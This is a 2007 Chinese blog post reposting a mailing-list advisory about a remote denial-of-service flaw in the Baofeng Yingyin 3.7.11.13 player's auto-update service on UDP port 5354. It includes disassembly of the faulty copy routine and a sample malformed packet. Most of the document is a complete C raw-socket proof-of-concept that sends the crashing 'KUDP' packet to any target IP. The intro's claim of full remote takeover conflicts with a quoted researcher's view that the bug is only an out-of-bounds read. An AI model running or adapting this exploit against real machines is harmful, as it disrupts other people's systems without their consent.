---
title: 暴风影音3.7.11.13 爆远程拒绝服务漏洞
description: 夜火：十几天前暴风影音3用户完美版放出，今天在幻影的maillist上就看到了这个帖子，云舒牛牛说：似乎算不上溢出只是读取源地址的时候越界，到了没有映射的内存区域，读取异常而已。传说中的《暴风影音3》新版本爆漏洞,这次很夸张,远程拒绝服务.起因是暴风影音自动更新程序会在远程监听一个端口,如果向其发送畸形数据包,就会导致自动更新程序崩溃;如果对其发送精心构造过的数据包,则足以导致用户主机在不知情的情况下被完全控制.以下是帖子全文:...............................
date: 2007-11-30 02:14:44
category: 漏洞信息
tags: ['暴风影音', 'exploit', '0day', '漏洞信息']
post_id: 271
alias: BaoFengYingYin-3.7.11.13-DOS-0day
ViewNums: 4600
---

夜火：十几天前[暴风影音3 用户完美版放出](/blog/baofeng3-3071113)，今天在幻影的mail list上就看到了这个帖子，[云舒](http://www.icylife.net)牛牛说：似乎算不上溢出只是读取源地址的时候越界，到了没有映射的内存区域，读取异常而已。

传说中的《暴风影音3》新版本爆漏洞,这次很夸张,远程拒绝服务.
起因是暴风影音自动更新程序会在远程监听一个端口,如果向其发送畸形数据包,就会导致自动更新程序崩溃;如果对其发送精心构造过的数据包,则足以导致用户主机在不知情的情况下被完全控制.
以下是帖子全文:

CISVul20071128

               暴风影音3.7.11.13 DOS Vul

|=----------------[ 暴风影音3.7.11.13 DOS Vulnerabilities ]-------=|
|=-----------------------------------------------------------------=|
|=---------------=[ TuTu<tutu@9.cn> ]=-----------------------------=|
|=-----------------------------------------------------------------=|
|=---------------=[ Copyright:[www.cisrg.cn](http://www.cisrg.cn/) ]=----------------------=|

--] 介绍
  暴风影音是一款播放软件，经过测试，暴风影音3.7.11.13存在一个远程DDOS漏洞。
  官方网站：<http://www.baofeng.com/>

--] Author：TuTu

--] 漏洞分析

/*++
暴风影音3　Build version : [3.7.11.13](http://3.7.11.13/)
Test version : [3.7.11.13](http://3.7.11.13/),自从带了一个自动升级服务stormlive.exe之后,
会在本地开启一个UDP端口5354,向端口发送恶意封包可造成stormlive崩溃

0041DEE0  /$  8B4424 08     mov     eax, dword ptr [esp+8]
0041DEE4  |.  53            push    ebx
0041DEE5  |.  8BD9          mov     ebx, ecx
0041DEE7  |.  56            push    esi
0041DEE8  |.  33C9          xor     ecx, ecx
0041DEEA  |.  57            push    edi
0041DEEB  |.  8943 08       mov     dword ptr [ebx+8], eax
0041DEEE  |.  6A 04         push    4                                ; /size = 4
0041DEF0  |.  C1E8 07       shr     eax, 7                           ; |
0041DEF3  |.  40            inc     eax                              ; |
0041DEF4  |.  894B 04       mov     dword ptr [ebx+4], ecx           ; |
0041DEF7  |.  C1E0 07       shl     eax, 7                           ; |
0041DEFA  |.  50            push    eax                              ; |nitems
0041DEFB  |.  884B 10       mov     byte ptr [ebx+10], cl            ; |
0041DEFE  |.  C703 C0524300 mov     dword ptr [ebx], 004352C0        ; |
0041DF04  |.  8943 0C       mov     dword ptr [ebx+C], eax           ; |
0041DF07  |.  FF15 78154300 call    dword ptr [<&MSVCRT.calloc>]     ; calloc
0041DF0D  |.  8B4B 08       mov     ecx, dword ptr [ebx+8]
0041DF10  |.  8B7424 18     mov     esi, dword ptr [esp+18]
0041DF14  |.  C1E1 02       shl     ecx, 2
0041DF17  |.  8943 04       mov     dword ptr [ebx+4], eax
0041DF1A  |.  8BF8          mov     edi, eax
0041DF1C  |.  8BC1          mov     eax, ecx
0041DF1E  |.  83C4 08       add     esp, 8
0041DF21  |.  C1E9 02       shr     ecx, 2
0041DF24  |.  F3:A5         rep     movs dword ptr es:[edi], dword p> 溢出
0041DF26  |.  8BC8          mov     ecx, eax
0041DF28  |.  83E1 03       and     ecx, 3
0041DF2B  |.  F3:A4         rep     movs byte ptr es:[edi], byte ptr>
0041DF2D  |.  8BCB          mov     ecx, ebx
0041DF2F  |.  E8 3C140000   call    0041F370
0041DF34  |.  5F            pop     edi
0041DF35  |.  8BC3          mov     eax, ebx
0041DF37  |.  5E            pop     esi
0041DF38  |.  5B            pop     ebx
0041DF39  .  C2 0800       retn    8

封包例子
00CAFF84  4B 55 44 50 01 00 55 55 55 00 55 55 55 00        KUDP .UUU.UUU.
由于没有对封包中取得的数据进行判断.数据超大导致申请内存失败,后面的内存数据复制导致异常.

--*/

--] exploit POC

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

// Set the packing to a 1 byte boundary
#include <pshpack1.h>

//
// Define the IPv4 header. Make the version and length field one
// character since we can't declare two 4 bit fields without
// the compiler aligning them on at least a 1 byte boundary.
//
typedef struct ip_hdr
{
    unsigned char  ip_verlen;        // 4-bit IPv4 version
                                     // 4-bit header length (in 32-bit words)
    unsigned char  ip_tos;           // IP type of service
    unsigned short ip_totallength;   // Total length
    unsigned short ip_id;            // Unique identifier
    unsigned short ip_offset;        // Fragment offset field
    unsigned char  ip_ttl;           // Time to live
    unsigned char  ip_protocol;      // Protocol(TCP,UDP etc)
    unsigned short ip_checksum;      // IP checksum
    unsigned int   ip_srcaddr;       // Source address
    unsigned int   ip_destaddr;      // Source address
} IPV4_HDR, *PIPV4_HDR, FAR * LPIPV4_HDR;

//
// Define the UDP header
//
typedef struct udp_hdr
{
    unsigned short src_portno;       // Source port no.
    unsigned short dst_portno;       // Dest. port no.
    unsigned short udp_length;       // Udp packet length
    unsigned short udp_checksum;     // Udp checksum (optional)
} UDP_HDR, *PUDP_HDR;

// Restore the byte boundary back to the previous value
#include <poppack.h>
//

// Function: checksum
//
// Description:
//    This function calculates the 16-bit one's complement sum
//    for the supplied buffer.
//
USHORT checksum(USHORT *buffer, int size)
{
    unsigned long cksum=0;

while (size > 1)
    {
        cksum += *buffer++;
        size  -= sizeof(USHORT);
    }
    if (size)
    {
        cksum += *(UCHAR*)buffer;
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16);

return (USHORT)(~cksum);
}

//
// Function: InitIpv4Header
//
// Description:
//    Initialize the IPv4 header with the version, header length,
//    total length, ttl, protocol value, and source and destination
//    addresses.
//
int InitIpv4Header(
    char *buf,
    char *src,
    char *dest,
    int payloadlen
    )
{
    IPV4_HDR    *v4hdr=NULL;

v4hdr = (IPV4_HDR *)buf;

v4hdr->ip_verlen      = (4 << 4) | (sizeof(IPV4_HDR) / sizeof(unsigned long));
    v4hdr->ip_tos         = 0;
    v4hdr->ip_totallength = htons(sizeof(IPV4_HDR) + payloadlen);
    v4hdr->ip_id          = 0;
    v4hdr->ip_offset      = 0;
    v4hdr->ip_ttl         = 128;
    v4hdr->ip_protocol    = 0x11;
    v4hdr->ip_checksum    = 0;
    v4hdr->ip_srcaddr     = inet_addr(src);
    v4hdr->ip_destaddr    = inet_addr(dest);

v4hdr->ip_checksum    = checksum((unsigned short *)v4hdr, sizeof(IPV4_HDR));

    return sizeof(IPV4_HDR);
}

//
// Function: ComputeUdpPseudoHeaderChecksumV4
//
// Description:
//    Compute the UDP pseudo header checksum. The UDP checksum is based
//    on the following fields:
//       o source IP address
//       o destination IP address
//       o 8-bit zero field
//       o 8-bit protocol field
//       o 16-bit UDP length
//       o 16-bit source port
//       o 16-bit destination port
//       o 16-bit UDP packet length
//       o 16-bit UDP checksum (zero)
//       o UDP payload (padded to the next 16-bit boundary)
//    This routine copies these fields to a temporary buffer and computes
//    the checksum from that.
//
void ComputeUdpPseudoHeaderChecksumV4(
    void    *iphdr,
    UDP_HDR *udphdr,
    char    *payload,
    int      payloadlen
    )
{
    IPV4_HDR     *v4hdr=NULL;
    unsigned long zero=0;
    char          buf[0x10000],
                 *ptr=NULL;
    int           chksumlen=0,
                  i;

    ptr = buf;

v4hdr = (IPV4_HDR *)iphdr;

// Include the source and destination IP addresses
    memcpy(ptr, &v4hdr->ip_srcaddr,  sizeof(v4hdr->ip_srcaddr));
    ptr += sizeof(v4hdr->ip_srcaddr);
    chksumlen += sizeof(v4hdr->ip_srcaddr);

memcpy(ptr, &v4hdr->ip_destaddr, sizeof(v4hdr->ip_destaddr));
    ptr += sizeof(v4hdr->ip_destaddr);
    chksumlen += sizeof(v4hdr->ip_destaddr);

    // Include the 8 bit zero field
    memcpy(ptr, &zero, 1);
    ptr++;
    chksumlen += 1;

// Protocol
    memcpy(ptr, &v4hdr->ip_protocol, sizeof(v4hdr->ip_protocol));
    ptr += sizeof(v4hdr->ip_protocol);
    chksumlen += sizeof(v4hdr->ip_protocol);

// UDP length
    memcpy(ptr, &udphdr->udp_length, sizeof(udphdr->udp_length));
    ptr += sizeof(udphdr->udp_length);
    chksumlen += sizeof(udphdr->udp_length);

    // UDP source port
    memcpy(ptr, &udphdr->src_portno, sizeof(udphdr->src_portno));
    ptr += sizeof(udphdr->src_portno);
    chksumlen += sizeof(udphdr->src_portno);

// UDP destination port
    memcpy(ptr, &udphdr->dst_portno, sizeof(udphdr->dst_portno));
    ptr += sizeof(udphdr->dst_portno);
    chksumlen += sizeof(udphdr->dst_portno);

// UDP length again
    memcpy(ptr, &udphdr->udp_length, sizeof(udphdr->udp_length));
    ptr += sizeof(udphdr->udp_length);
    chksumlen += sizeof(udphdr->udp_length);

    // 16-bit UDP checksum, zero
    memcpy(ptr, &zero, sizeof(unsigned short));
    ptr += sizeof(unsigned short);
    chksumlen += sizeof(unsigned short);

// payload
    memcpy(ptr, payload, payloadlen);
    ptr += payloadlen;
    chksumlen += payloadlen;

// pad to next 16-bit boundary
    for(i=0 ; i < payloadlen%2 ; i++, ptr++)
    {
        printf("pad one byte
");
        *ptr = 0;
        ptr++;
        chksumlen++;
    }

// Compute the checksum and put it in the UDP header
    udphdr->udp_checksum = checksum((USHORT *)buf, chksumlen);

return;
}

//
// Function: InitUdpHeader
//
// Description:
//    Setup the UDP header which is fairly simple. Grab the ports and
//    stick in the total payload length.
//
int InitUdpHeader(
    char *buf,
    int srcprt,
    int dstprt,
    int       payloadlen
    )
{
    UDP_HDR *udphdr=NULL;

udphdr = (UDP_HDR *)buf;
    udphdr->src_portno = htons(srcprt);
    udphdr->dst_portno = htons(dstprt);
    udphdr->udp_length = htons(sizeof(UDP_HDR) + payloadlen);

return sizeof(UDP_HDR);
}

//
// Function: sendudp
//
// Description:
//    Send the udp packets with RAW SOCKET
//
int sendudp(char *srcip, char *dstip, int srcprt, int dstprt, char *buf, int bufsize)
{
    WSADATA            wsd;
    SOCKET             s;
    char sendbuf[0x10000]={0};
    int           iphdrlen,
                  allsize,
                  udphdrlen;
    int     optlevel,
                option,
                optval,
                rc;
    SOCKADDR_IN    ReceiverAddr;

ReceiverAddr.sin_family = AF_INET;
    ReceiverAddr.sin_port = htons(dstprt);
    ReceiverAddr.sin_addr.s_addr = inet_addr(dstip);

    allsize = sizeof(IPV4_HDR) + sizeof(UDP_HDR) + bufsize;
    if (WSAStartup(MAKEWORD(2,2), &wsd) != 0)
    {
        printf("WSAStartup() failed: %d
", GetLastError());
        return -1;
    }

s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (s == INVALID_SOCKET)
    {
        fprintf(stderr, "socket failed: %d
", WSAGetLastError());
        return -1;
    }

// Enable the IP header include option
    optval = 1;
    optlevel = IPPROTO_IP;
    option   = IP_HDRINCL;
    rc = setsockopt(s, optlevel, option, (char *)&optval, sizeof(optval));
    if (rc == SOCKET_ERROR)
    {
        fprintf(stderr, "setsockopt: IP_HDRINCL failed: %d
", WSAGetLastError());
        return -1;
    }

    // Initialize the v4 header
    iphdrlen = InitIpv4Header(
            sendbuf,
            srcip,
            dstip,
            bufsize
            );

// Initialize the UDP header
    udphdrlen = InitUdpHeader(
           &sendbuf[iphdrlen],
            srcprt,
            dstprt,
            bufsize
            );

// Compute the UDP checksum
    ComputeUdpPseudoHeaderChecksumV4(
            sendbuf,
            (UDP_HDR *)&sendbuf[iphdrlen],
            buf,
            bufsize
            );

// Copy the payload to the end of the header
    memcpy(&sendbuf[iphdrlen + udphdrlen], buf, bufsize);

rc = sendto(
                        s,
                        sendbuf,
                        allsize,
                        0,
                        (const struct sockaddr*)&ReceiverAddr,
                        sizeof(ReceiverAddr)
                        );
    if (rc == SOCKET_ERROR)
    {
        printf("sendto() failed: %d
", WSAGetLastError());
    }
    else
    {
        printf("sent %d bytes
", rc);
    }
    closesocket(s) ;
    WSACleanup() ;

return 0;
}

int main(int argc, char **argv)
{
 if (argc < 3) {
  printf("%s <LOCAL ip> <Remote ip>
", argv[0]);
  return 0;
 }

printf("
暴风影音3 stormlive.exe DDOS
");
 printf("[www.CISRG.cn](http://www.cisrg.cn/)
");
 printf("E-mail: tutu@9.cn");
 printf("Copyright (c) 2007 .: Tutu :.
");

sendudp(argv[1], argv[2], 5354, 5354, "KUDPx01x00x55x55x55x00x55x55x55x00", 14);
    getchar();
    return 0;
}

